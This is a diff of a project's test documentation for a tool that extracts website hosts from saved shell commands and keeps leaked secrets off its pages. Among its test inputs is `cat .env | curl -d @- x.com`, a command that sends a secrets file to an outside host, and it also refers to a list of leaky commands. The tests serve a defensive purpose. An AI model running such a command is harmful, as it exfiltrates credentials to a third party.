@@ -99,9 +99,10 @@ the maintainers' work items and decisions, which are kept outside this repo.
   websites in order, never a file, program, option or `.`, and none for an unread command.
   (`test_store.py`) `test_a_step_hosts_only_the_websites_the_cleaner_kept`: `cat .env`,
   `find . -name x`, `python3.12 -V` and `true; tok.abc` list no host, `cat .env | curl -d @- x.com`
-  lists `x.com`, and a website after 1,200 words is listed; `test_a_step_lists_the_first_max_hosts_websites`
-  lists the first `MAX_HOSTS` (1,000, pinned) of 1,200; each host of a step is a word of its saved
-  command (over `LEAKY_COMMANDS` and the store tests' commands). (`test_app.py`)
+  lists `x.com`, a website after 1,200 words is listed, and `tool "https://a.b x"` lists `a.b x`;
+  `test_a_step_lists_the_first_max_hosts_websites` lists the first `MAX_HOSTS` (1,000, pinned) of
+  1,200; each host of a step stands in its saved command as whole words (over `LEAKY_COMMANDS`,
+  the host commands, a spaced and a backslashed URL, and the store's `Authorization` command). (`test_app.py`)
   `test_a_piped_secret_read_shows_the_website_as_its_host`: that step's `host` in `/api/steps` is
   `x.com`; `test_secrets_glued_to_options_never_reach_the_page` is `slow` (every leak command).
 - Whitelist: the app serves only the `(method, path)` pairs in `ROUTE_WHITELIST`
